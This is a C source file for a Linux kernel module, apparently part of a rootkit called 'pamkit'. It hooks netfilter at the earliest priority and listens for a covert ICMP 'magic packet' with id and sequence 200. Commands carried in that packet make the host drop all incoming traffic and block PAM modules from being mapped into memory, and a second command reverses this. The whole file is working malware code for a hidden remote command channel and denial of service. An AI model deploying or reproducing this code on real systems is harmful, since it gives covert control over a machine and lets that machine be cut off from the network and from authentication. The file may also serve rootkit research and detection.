#include "net.h"
#include "util/log.h"

#include <linux/err.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/version.h>

#define ICMP_DATA_OFFSET 8

#define MAGIC_PKT_ID 200
#define MAGIC_PKT_SEQNR 200

/* Causes all incoming packets to be dropped and a flag is set that prohibits the mapping of PAM modules into memory */
#define CMD_START_DOS "pamkit-dos-1"
/* Undoes the effects of 'cmd_start_dos' */
#define CMD_END_DOS "pamkit-dos-0"

int prevent_pam_mod_mapping = 0;
static int drop_all_incoming_packets = 0;

static inline unsigned char
ip_header_len_bytes(const struct iphdr *ip_header)
{
    return ip_header->ihl << 2;
}

static int
is_magic_packet(struct sk_buff *skb)
{
    const struct iphdr *ip_header;
    const struct icmphdr *icmp_header;

    if (!skb) {
        return 0;
    }

    ip_header = ip_hdr(skb);
    if (IS_ERR_OR_NULL(ip_header)) {
        return 0;
    }

    if (ip_header->protocol != IPPROTO_ICMP) {
        return 0;
    }

    icmp_header = icmp_hdr(skb);

    if (icmp_header->type != ICMP_ECHO || icmp_header->code != 0x00) {
        return 0;
    }

    if ((ntohs(icmp_header->un.echo.id) != MAGIC_PKT_ID) ||
            (ntohs(icmp_header->un.echo.sequence) != MAGIC_PKT_SEQNR)) {
        return 0;
    }

    return 1;
}

static inline char *
get_magic_packet_data(struct sk_buff *skb)
{
    const struct iphdr *ip_header = ip_hdr(skb);
    const unsigned char iphdr_len = ip_header_len_bytes(ip_header);

    if (!pskb_may_pull(skb, iphdr_len + ICMP_DATA_OFFSET + 1)) {
        prwarn_ratelimited("Received malformed magic packet. Not enough data to extract a command");
        return NULL;
    }

    return (char *) (skb->data + iphdr_len + ICMP_DATA_OFFSET);
}

static int
execute_command(struct sk_buff *skb)
{
    const char *cmd;
    unsigned int payload_len;

    cmd = get_magic_packet_data(skb);
    if (!cmd) {
        return -1;
    }

    payload_len = skb->len - (cmd - (char *)skb->data);

    if (payload_len >= sizeof(CMD_START_DOS) && !strncmp(cmd, CMD_START_DOS, sizeof(CMD_START_DOS))) {
        prdebug_ratelimited("Received '%s' cmd", CMD_START_DOS);
        WRITE_ONCE(drop_all_incoming_packets, 1);
        WRITE_ONCE(prevent_pam_mod_mapping, 1);
        return 0;
    } else if (payload_len >= sizeof(CMD_END_DOS) && !strncmp(cmd, CMD_END_DOS, sizeof(CMD_END_DOS))) {
        prdebug_ratelimited("Received '%s' cmd", CMD_END_DOS);
        WRITE_ONCE(drop_all_incoming_packets, 0);
        WRITE_ONCE(prevent_pam_mod_mapping, 0);
        return 0;
    } else {
        prdebug_ratelimited("Received unknown command '%.*s'", payload_len, cmd);
        return -1;
    }
}

static unsigned int
nf_callback(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    if (unlikely(is_magic_packet(skb))) {
        return (execute_command(skb) < 0) ? NF_DROP : NF_ACCEPT;
    }

    if (READ_ONCE(drop_all_incoming_packets)) {
        return NF_DROP;
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops magic_packet_listener = {
    .hook = nf_callback,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
    .hooknum = NF_INET_PRE_ROUTING,
};

int
add_netfilter_hook(void)
{
    int ret;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    ret = nf_register_net_hook(&init_net, &magic_packet_listener);
    #else
    ret = nf_register_hook(&magic_packet_listener);
    #endif

    if (ret < 0) {
        return ret;
    }

    prdebug("Successfully installed netfilter hook");
    return 0;
}

void
remove_netfilter_hook(void)
{
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    nf_unregister_net_hook(&init_net, &magic_packet_listener);
    #else
    nf_unregister_hook(&magic_packet_listener);
    #endif

    prdebug("Removed netfilter hook");
}
